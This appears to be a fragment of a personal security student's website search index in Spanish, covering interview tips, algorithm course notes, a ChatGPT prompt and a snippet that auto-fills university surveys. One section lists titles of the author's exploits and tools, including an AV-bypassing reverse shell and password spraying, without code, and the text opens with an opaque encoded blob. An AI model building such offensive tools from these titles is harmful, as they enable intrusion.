Nqqe9x(bLt9VYzrPXufoOekHKq5hD260IVSdILQrhMNwCX5V)JF(cvfxV9MFEzNX(JZ3E7Qn3bTbQjKQz9Jx)AA9ho2VI)ps)kF3UuEPjMt774ud(lY3rz60gy(FT3e5)uVj)9Z)WvVDpvVbqiCkqWmy)FhfG8piEaHHiTqeJFfkilnW8kIQnjK2bPoXKP3ee8DA3719m(1yJ3ese)Jaj(V0c7PqIxCaFTqCkq5RCpVLF)THjFhdWrqs6pzdShl27rjvwBfu58s91jNosfi710B9CzOuy1sQ6TgDrTyRObOcegCqZw9juO02R26JvWP6gPHdzJQPp5YwHjijJrwNCb0Xlxh42h568i)i5DOzyBSajWBJ2LqLoYJXlgDD9kywAagJKqdjLOJkGpL1kbQ9rtb4(r219cuwRHXqzS3M1yVEYSqa2anuq0nAuoVXsfgw)OLPGWQR1mRVGl1ny5dJh1AYDQli1MyKErh6KY2OIb6SIuMusoUWWoumUBWIX1fGBN8OaBGVTHci4wZHioLZQTdlMfr8K)K6cTzrvjp7KY6A9yRiGAr1i3Gu)IXdpBuTZ(sZajUIXoz0pkAGSePlQbUPKYKG2YyP6wNPHEUavzmngZbUsIX4i3C2z4tHVPZsqz3vTQ3O2RP8ODfIFKYOVHM2dQjtr7zsGSvmnCqpsPXzpFbO3yVfb6UjWc2bTqNosWVufrNrgoJe97wWJ9XdNlT5Jwd15iJgiszESGauGme)kwgr7PFI9IU0EP8E7Y2XMMsHI9ImrRBAp4K6maAvySAuv5rFI2JnOVEvYWaI1BmmG2RE1FJHZuUZ2Z70FEJVPn5G(id89YG1kA30OfZJKKF5HGEH6pewcKciGLxfGzPXdR5Ih7DmZB44JqaJLY5(6xE4MdFBTJ3OszzuPeDtyvkF)f)T)evjp7txD1NU4KQKJpZQKq9dvugS0qbr15J6GLxOkb7k(xcD0eCEwc9TRsEkVJJusEHLYjvh1)FbQLDy7dlgfjWx(LL72RAjkMDyA6F)y9ZDac\n</code></pre>"},{"location":"jobs/jobs/","title":"Tips para entrevistas de trabajo","text":"<ol> <li>Pregunt\u00e1 sobre la empresa, el puesto y el equipo e investigalos</li> <li>Preparate para hablar de tus experiencias pasadas</li> <li>Investigar a los entrevistadores</li> <li>Iluminaci\u00f3n buena</li> <li>Vestimenta adecuada</li> </ol>"},{"location":"jobs/jobs/#metodo-star","title":"Metodo STAR","text":"<ul> <li>Situaci\u00f3n: Describe el contexto en el que ocurri\u00f3 la situaci\u00f3n.</li> <li>Tarea: Describe la tarea que ten\u00edas que realizar.</li> <li>Acci\u00f3n: Describe las acciones que tomaste para abordar la situaci\u00f3n.</li> <li>Resultado: Describe los resultados de tus acciones.</li> </ul>"},{"location":"jobs/jobs/#ejemplo","title":"Ejemplo:","text":"<ul> <li>Situaci\u00f3n: En mi trabajo anteriormente solo usabamos SAST.</li> <li>Tarea: Necesitabamos implementar DAST.</li> <li>Acci\u00f3n: Investigu\u00e9 y propuse una soluci\u00f3n a los directivos</li> <li>Resultado: Implementamos DAST y a los 2 meses el KPI del security champions program mejor\u00f3 un 13,22% sin hacer ning\u00fan esfuerzo extra</li> </ul>"},{"location":"scripts/scripts/","title":"My own scripts &amp; Exploits","text":"<ul> <li>Http request to ffuf command</li> <li>Active Directory LPE Backup Operator to Domain Admin</li> <li>HTB STREAMIO SQLI exploit automated</li> <li>HTB INTELLIGENCE PDF FUZZER</li> <li>Self injection DLL</li> <li>[WIP] Malware Development RevShell for Windows 11 24H2 - AV FULL BYPASS</li> <li>HTB Support Reverse engineer password script</li> <li>CVE-2023-2255</li> <li>HTB Intentions LPE custom SUID binary</li> <li>CVE-2023-40931-POC</li> <li>SSRF CVE-2023-27163 + MalTrail RCE automated exploit</li> <li>CVE-2023-32784 Password Combinator Fixer Exploit</li> <li>HTB Editorial SSRF enumerate exploit</li> <li>Werkzeug Console Ping Exploit</li> <li>KeePass Process Detector</li> <li>Season Password Generator</li> <li>CPP EnableSeLoadDriverPrivilege</li> <li>LD Preload Privilege Escalation</li> <li>Windows Tools CPTS</li> <li>Magic Byte Image Creator</li> <li>HTB Academy Go PIN Brute Forcer</li> <li>HTB Academy Skills Assessment Using Web Proxies</li> <li>Password Spraying Script NTLM</li> </ul>"},{"location":"university/Chat-GPT-PROMPTS-made-by-me/","title":"Chat GPT PROMPTS made by me","text":""},{"location":"university/Chat-GPT-PROMPTS-made-by-me/#prompt-para-que-rendericen-latex","title":"Prompt para que rendericen LaTeX","text":"<p>S\u00ed le das una consigna de matematica, o algo en latex, y le pon\u00e9s que lo renderice en latex. Te va a hacer un snippet para que vos lo renderices. Pero Chat GPT renderiza latex. Con este prompt luego de pasarle la pregunta, cuesti\u00f3n, consigna te renderiza correctamente con LaTex.</p> <p>```Chat GPT tu puedes renderizar latex, cuando te pido ayuda con integrales me escribes las integrales en formato de latex y lo puedo leer por fuera de un snippet.</p> <p>Puedes renderizar MARKDOWN y LATEX.</p> <p>Renderiza eso por favor, y no me digas que no puedes porque eso es mentira! Si puedes! ```</p>"},{"location":"university/algebrataller/","title":"Algebrataller","text":"<p>encontre esto</p>"},{"location":"university/algo3/","title":"Ejercicios de algoritmos 3 &amp; Apuntes de teor\u00eda","text":""},{"location":"university/algo3/#notas-en-manuscrito","title":"Notas en manuscrito","text":""},{"location":"university/algo3/#latex-ocr","title":"LaTeX OCR","text":""},{"location":"university/algo3/#apuntes-resumenes-teoricos","title":"Apuntes &amp; Resumenes teoricos","text":"<ul> <li>Backtracking</li> <li>Programaci\u00f3n dinamica + notas del cormen</li> <li>Dividir &amp; Conquistar</li> <li>Greedy: INCOMPLETO</li> <li>Teor\u00eda de Grafos</li> <li>Teor\u00eda de Arboles</li> <li>P\u2286AGM\u21d2P MiniMax</li> <li>Teor\u00eda de camino minimo</li> </ul>"},{"location":"university/algo3/#practica-1-backtracking-programacion-dinamica-greedy","title":"Practica 1 - Backtracking - Programaci\u00f3n Dinamica - Greedy","text":"<ul> <li>Ejercicio 2</li> <li>Ejercicio 3</li> <li>Ejercicio 5</li> <li>Ejercicio 6</li> <li>Ejercicio 7</li> <li>Ejercicio 8</li> <li>Ejercicio 9</li> <li>Ejercicio 13 INCOMPLETO</li> <li>Ejercicio 13 Hecho por Federico Lebron</li> <li>Ejercicio 14</li> <li>Ejercicio 16</li> </ul>"},{"location":"university/algo3/#practica-2-divide-conquer","title":"Practica 2 Divide &amp; Conquer","text":"<ul> <li>Ejercicio 1</li> <li>Ejercicio 2</li> <li>Ejercicio 5</li> <li>Ejercicio 6</li> <li>Ejercicio 7</li> <li>Ejercicio 8</li> </ul>"},{"location":"university/algo3/#practica-3-intro-a-grafos","title":"Practica 3 Intro a grafos","text":"<ul> <li>Ejercicio 2</li> <li>Ejercicio 3</li> <li>Ejercicio 4</li> <li>Ejercicio 9</li> <li>Ejercicio 9 hecho por Federico Lebron (est\u00e1 impecable la resoluci\u00f3n)</li> </ul>"},{"location":"university/algo3/#practica-4-arboles-y-grafos","title":"Practica 4 arboles y grafos","text":"<ul> <li>Ejercicio 1</li> <li>Ejercicio 2</li> <li>Ejercicio 5</li> <li>Ejercicio 8</li> <li>Ejercicio 10</li> <li>Ejercicio 11 Incompleto</li> <li>Ejercicio 13</li> <li>Ejercicio 14</li> <li>Ejercicio 16</li> </ul>"},{"location":"university/algo3/#practica-5-recorrido-minimo","title":"Practica 5 Recorrido minimo","text":"<ul> <li>Ejercicio 1</li> <li>Ejercicio 2</li> <li>Ejercicio 3</li> <li>Ejercicio 7</li> <li>Ejercicio 8</li> </ul>"},{"location":"university/algo3/#practica-6-flujos","title":"Practica 6 flujos","text":"<ul> <li>Ejercicio 1</li> </ul>"},{"location":"university/calculusII/","title":"calculusII","text":"<p>Calculus II useful things</p> <p></p> <p></p>"},{"location":"university/encuestas/","title":"Script para rellenar encuestas automaticamente SIU GUARAN\u00cd","text":""},{"location":"university/encuestas/#disclaimer-recomiendo-completar-las-encuestas-honestamente","title":"Disclaimer: Recomiendo completar las encuestas honestamente","text":""},{"location":"university/encuestas/#pero-hay-veces-que-uno-no-fue-nunca-a-clases-y-aprobo-de-todas-formas-etc","title":"Pero hay veces que uno no fue nunca a clases y aprob\u00f3 de todas formas, etc.","text":"<ul> <li>podes cambiarle el <code>value=\"0\"</code> por inner message <code>\"1\"</code> o algo asi para que te agarre el peor puntaje</li> </ul> <pre><code>// Get all the radio buttons\nconst radioButtons = document.querySelectorAll('input[type=\"radio\", value=\"0\"]');\n\n// Iterate through each radio button\nradioButtons.forEach(radioButton =&gt; {\n    radioButton.checked = true\n});\n</code></pre>"},{"location":"university/plp/","title":"Ejercicios de PLP &amp; Apuntes de teor\u00eda","text":""},{"location":"university/plp/#notas-en-manuscrito","title":"Notas en manuscrito","text":""},{"location":"university/plp/#teoricas","title":"Teoricas","text":"<p>Teorica de funcional</p>"},{"location":"university/plp/#practicas","title":"Practicas","text":""},{"location":"university/plp/#practica-0","title":"Practica 0","text":"<ul> <li>Ejercicio 2</li> <li>Ejercicio 3</li> <li>Ejercicio 4</li> <li>Ejercicio 5</li> </ul>"},{"location":"university/plp/#practica-1","title":"Practica 1","text":"<ul> <li>Ejercicio 1</li> </ul>"},{"location":"university/university/","title":"Apuntes universitarios","text":"<ul> <li> <p>Calculus II</p> </li> <li> <p>Chat GPT prompts made by me</p> </li> <li> <p>LaTeX CheatSheet for DC-UBA's templates</p> </li> <li> <p>Ejercicios resueltos de algoritmos 3 / TDA</p> </li> <li> <p>Paradigmas de Programaci\u00f3n</p> </li> <li> <p>Script encuestas respuestas automaticas siu guaran\u00ed</p> </li> </ul>"}]}